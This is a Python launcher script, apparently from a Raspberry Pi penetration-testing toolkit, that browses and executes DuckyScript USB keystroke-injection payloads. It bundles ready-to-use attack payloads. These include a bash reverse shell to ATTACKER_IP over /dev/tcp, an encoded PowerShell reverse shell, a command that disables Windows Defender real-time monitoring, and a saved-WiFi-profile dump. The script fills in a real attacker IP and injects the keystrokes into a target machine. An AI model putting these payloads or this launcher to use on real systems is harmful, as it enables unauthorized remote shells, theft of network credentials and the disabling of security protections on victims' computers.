#!/usr/bin/env python3
# @name: DuckyScript Library & Launcher
# @desc: Browse, preview, and execute DuckyScript payloads stored in /root/Raspyjack/payloads/hid_scripts/.
# @category: usb
# @danger: false
# @active: true
# @web: true
"""
RaspyJack Payload -- DuckyScript Library & Launcher
=====================================================
Author: 7h30th3r0n3

Browse, preview, and execute DuckyScript payloads stored in
$CITYPOP_ROOT/payloads/hid_scripts/. Bundles a set of common
offensive scripts and allows editing the ATTACKER_IP placeholder.

Setup / Prerequisites:
  - Script files in $CITYPOP_ROOT/payloads/hid_scripts/.
  - Edit ATTACKER_IP placeholder in scripts before use.
  - Requires hid_injector.py gadget setup.

Controls (CLI):
  python3 ducky_library.py [SCRIPT] [--list] [--preview] [--ip IP]

  SCRIPT     Filename to run (from the scripts directory). If omitted,
             you'll be prompted to pick one from the discovered list.
  --list     List available scripts (with a one-line preview) and exit.
  --preview  Print the script contents and confirm before executing.
  --ip IP    Attacker IP to substitute for the ATTACKER_IP placeholder.
             Prompted if the script needs it and this is omitted.
"""

from payloads._web_input import request_input
import os
import sys
import time
import subprocess
import argparse
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
SCRIPTS_DIR = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'payloads', 'hid_scripts')
HID_INJECTOR = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'payloads', 'usb', 'hid_injector.py')
IP_PLACEHOLDER = "ATTACKER_IP"

os.makedirs(SCRIPTS_DIR, exist_ok=True)

# ---------------------------------------------------------------------------
# Bundled scripts (created if missing)
# ---------------------------------------------------------------------------
BUNDLED_SCRIPTS = {
    "reverse_shell_windows.txt": (
        "REM Reverse shell via PowerShell (Windows)\n"
        "GUI r\n"
        "DELAY 500\n"
        "STRING powershell -e "
        "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AH"
        "MAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBl"
        "AG4AdAAoACIAQQBUAFQAQQBDAEsARQBSAF8ASQBQACIALAA0ADQANAA0ACkA\n"
        "ENTER\n"
    ),
    "reverse_shell_linux.txt": (
        "REM Reverse shell via bash (Linux)\n"
        "CTRL ALT t\n"
        "DELAY 500\n"
        "STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n"
        "ENTER\n"
    ),
    "exfil_wifi_windows.txt": (
        "REM Exfiltrate saved WiFi profiles (Windows)\n"
        "GUI r\n"
        "DELAY 500\n"
        "STRING cmd /c \"netsh wlan show profiles\" > %TEMP%\\w.txt\n"
        "ENTER\n"
    ),
    "disable_defender.txt": (
        "REM Disable Windows Defender real-time monitoring\n"
        "GUI r\n"
        "DELAY 500\n"
        "STRING powershell Set-MpPreference "
        "-DisableRealtimeMonitoring $true\n"
        "ENTER\n"
    ),
    "rickroll.txt": (
        "REM Open Rick Astley - educational purposes\n"
        "GUI r\n"
        "DELAY 500\n"
        "STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\n"
        "ENTER\n"
    ),
}

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
attacker_ip = "10.0.0.1"


# ---------------------------------------------------------------------------
# Script management
# ---------------------------------------------------------------------------

def _ensure_bundled():
    """Create bundled scripts if they do not exist."""
    for fname, content in BUNDLED_SCRIPTS.items():
        path = os.path.join(SCRIPTS_DIR, fname)
        if not os.path.isfile(path):
            with open(path, "w") as f:
                f.write(content)


def _scan_scripts():
    """List available DuckyScript files."""
    found = []
    if os.path.isdir(SCRIPTS_DIR):
        for fname in sorted(os.listdir(SCRIPTS_DIR)):
            if fname.endswith((".txt", ".ducky", ".ds")):
                found.append(fname)
    return found


def _read_script(fname):
    """Read script content, return list of lines."""
    path = os.path.join(SCRIPTS_DIR, fname)
    try:
        with open(path, "r") as f:
            return f.readlines()
    except Exception:
        return ["(Error reading file)"]


def _first_line(fname):
    """Return first non-comment line of a script for preview."""
    path = os.path.join(SCRIPTS_DIR, fname)
    try:
        with open(path, "r") as f:
            for raw in f:
                stripped = raw.strip()
                if stripped and not stripped.startswith("REM"):
                    return stripped[:20]
        return "(empty)"
    except Exception:
        return "(err)"


def _replace_ip_in_script(fname):
    """Replace ATTACKER_IP placeholder with current IP, return temp path."""
    path = os.path.join(SCRIPTS_DIR, fname)
    try:
        with open(path, "r") as f:
            content = f.read()
    except Exception:
        return path

    ip = attacker_ip

    if IP_PLACEHOLDER not in content:
        return path

    replaced = content.replace(IP_PLACEHOLDER, ip)
    tmp_path = os.path.join(
        SCRIPTS_DIR,
        f".tmp_{os.path.basename(fname)}",
    )
    with open(tmp_path, "w") as f:
        f.write(replaced)
    return tmp_path


# ---------------------------------------------------------------------------
# Execution
# ---------------------------------------------------------------------------

def _execute_script(fname):
    """Execute a DuckyScript via hid_injector subprocess."""
    print(f"Executing {fname} ...", flush=True)

    script_path = _replace_ip_in_script(fname)

    try:
        print("Running hid_injector...", flush=True)
        result = subprocess.run(
            ["python3", HID_INJECTOR, script_path],
            capture_output=True, text=True, timeout=120,
        )
        if result.stdout:
            print(result.stdout, end="" if result.stdout.endswith("\n") else "\n", flush=True)

        if result.returncode == 0:
            print(f"Done: {fname}", flush=True)
        else:
            err = result.stderr.strip() if result.stderr else "error"
            print(f"Failed ({result.returncode}): {err}", flush=True)

    except subprocess.TimeoutExpired:
        print("Execution timeout.", flush=True)
    except Exception as exc:
        print(f"Error: {exc}", flush=True)
    finally:
        # Cleanup temp file
        tmp = os.path.join(SCRIPTS_DIR, f".tmp_{fname}")
        if os.path.isfile(tmp):
            try:
                os.unlink(tmp)
            except OSError:
                pass


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def _prompt_for_script(scripts_found):
    """Prompt the operator to pick a script from the discovered list."""
    print("Available scripts:", flush=True)
    for i, fname in enumerate(scripts_found, 1):
        print(f"  {i}. {fname} - {_first_line(fname)}", flush=True)
    choice = request_input(f"Select script [1-{len(scripts_found)}]: ").strip()
    if not choice.isdigit() or not (1 <= int(choice) <= len(scripts_found)):
        print("Invalid selection.", flush=True)
        return None
    return scripts_found[int(choice) - 1]


def main():
    global attacker_ip

    parser = argparse.ArgumentParser(
        description="DuckyScript Library & Launcher - browse and execute "
                     "bundled/stored DuckyScript payloads via hid_injector.py.",
    )
    parser.add_argument(
        "script", nargs="?",
        help="Script filename to run (from the scripts directory). If "
             "omitted, you'll be prompted to pick one.",
    )
    parser.add_argument(
        "--list", action="store_true",
        help="List available scripts (with a one-line preview) and exit.",
    )
    parser.add_argument(
        "--preview", action="store_true",
        help="Print the script contents and confirm before executing.",
    )
    parser.add_argument(
        "--ip", metavar="IP",
        help="Attacker IP to substitute for the ATTACKER_IP placeholder. "
             "Prompted if the script needs it and this is omitted.",
    )
    opts = parser.parse_args()

    _ensure_bundled()
    scripts_found = _scan_scripts()
    print(f"Found {len(scripts_found)} scripts in {SCRIPTS_DIR}", flush=True)

    if opts.list:
        if not scripts_found:
            print("No scripts found.", flush=True)
        for i, fname in enumerate(scripts_found, 1):
            print(f"{i}. {fname} - {_first_line(fname)}", flush=True)
        return 0

    if not scripts_found:
        print("No scripts found.", flush=True)
        return 1

    selected = opts.script
    if selected is None:
        selected = _prompt_for_script(scripts_found)
        if selected is None:
            return 1
    elif selected not in scripts_found:
        print(f"Script not found: {selected}", flush=True)
        print("Available scripts: " + ", ".join(scripts_found), flush=True)
        return 1

    lines = _read_script(selected)
    if IP_PLACEHOLDER in "".join(lines):
        if opts.ip:
            attacker_ip = opts.ip
        else:
            attacker_ip = request_input(
                f"Attacker IP for {IP_PLACEHOLDER} [{attacker_ip}]: "
            ).strip() or attacker_ip
        print(f"Using attacker IP: {attacker_ip}", flush=True)

    if opts.preview:
        print(f"--- {selected} ---", flush=True)
        for line in lines:
            print(line.rstrip("\n"), flush=True)
        print("--- end preview ---", flush=True)
        answer = request_input("Execute this script? [y/N]: ").strip().lower()
        if answer != "y":
            print("Aborted.", flush=True)
            return 0

    try:
        _execute_script(selected)
    except KeyboardInterrupt:
        print("\nInterrupted by operator.", flush=True)
        return 1

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
